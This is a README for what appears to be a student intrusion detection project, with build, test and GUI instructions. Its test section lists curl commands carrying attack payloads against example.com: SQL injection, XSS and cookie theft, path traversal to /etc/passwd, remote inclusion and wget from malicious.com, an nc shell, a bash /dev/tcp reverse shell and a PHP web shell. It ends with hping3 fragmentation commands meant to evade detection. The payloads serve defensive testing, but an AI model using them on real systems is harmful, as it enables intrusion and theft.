# Is_innovation
将demo的C文件改成了C++

demo运行方法：
```
cd demo
g++ -o detection.out patternDetection.cpp -lpcap
sudo ./detection.out patternfile
```
模拟攻击：
```
curl "http://example.com/whois_raw.cgi?fqdn=%0acat%20/etc/passwd"
curl "http://example.com/faxsurvey?/bin/cat%20/etc/passwd"
curl "http://example.com/search?query=%27%20OR%20%271%27=%271"
curl "http://example.com/search?query=UNION%20SELECT%20null,%20null"
curl "http://example.com/search?query=%27%20OR%201=1;--"
curl "http://example.com/search?query=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"
curl "http://example.com/search?query=%3Cimg%20src=x%20onerror=alert(%27XSS%27)%3E"
curl "http://example.com/search?query=%3Ciframe%20src=javascript:alert(%27XSS%27)%3E"
curl "http://example.com/file=../../../../etc/passwd"
curl "http://example.com/file=../../../../etc/passwd"
curl "http://example.com/include=http://malicious.com/shell.txt"
curl "http://example.com/search?query=%7C%20wget%20http://malicious.com"
curl "http://example.com/search?query=%7C%20nc%20-e%20/bin/sh"
curl "http://example.com/search?query=%7C%20/bin/bash%20-i%20%3E%26%20/dev/tcp/0.0.0.0/1234%200%3E%261"
curl "http://example.com/search?query=%2A%29%28%7C%28cn=%2A%29%29"
curl "http://example.com/search?query=;%20/bin/bash%20-c%20%27cat%20/etc/passwd%27"
curl "http://example.com/search?query=1%27%20AND%201=1--"
curl "http://example.com/search?query=1%27%20WAITFOR%20DELAY%20%270:0:5%27--"
curl "http://example.com/search?query=%3Cstyle%3E@import%27javascript:alert(%27XSS%27)%27%3C/style%3E"
curl "http://example.com/search?query=%3Fphp=system(%24_GET[%27cmd%27]);%3E"
curl "http://example.com/search?query=%3Cbody%20onload=alert(%27XSS%27)%3E"
curl "http://example.com/search?query=%27%20OR%201=1%20--"
curl "http://example.com/search?query=%27;%20WAITFOR%20DELAY%20%270:0:5%27%20--"
curl "http://example.com/search?query=%3Csvg%20onload=alert(%27XSS%27)%3E"
curl "http://example.com/search?query=%3Clink%20rel=stylesheet%20href=javascript:alert(%27XSS%27)%3E"
curl "http://example.com/search?query=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
curl "http://example.com/search?query=%3Fphp=system(%24_GET[%27cmd%27]);%3E"
curl "http://example.com/search?query=file=http://example.com/shell.txt?"



```

项目运行方法：
```
cd ~/IDS/build
rm -rf *
cmake ..
make
sudo ./main ../patterns/patternfile BF   #指定攻击算法为BF（可以改成其他）

```

增加了三种字符匹配的算法：暴力匹配，KMP，BM，在src/algorithms文件夹中
并且添加了这三种算法的测试，在test文件夹中
测试运行方法：
```
ctest -V

```

图形化界面使用方法：
```
sudo apt-get install libgtk-3-dev
gcc -o main_window main_window.c `pkg-config --cflags --libs gtk+-3.0`
./main_window

```

```
合并报文攻击
# First fragment
sudo hping3 -c 1 -d 20 -E <(echo -n "GET /whois_raw.cgi?fqdn=") -p 80 --frag --fragoff 0 --tcp-mss 20 --tcp-timestamp --keep -S example.com

# Second fragment
sudo hping3 -c 1 -d 20 -E <(echo -n "%0acat%20/etc/passwd") -p 80 --frag --fragoff 20 --tcp-mss 20 --tcp-timestamp --keep -S example.com

```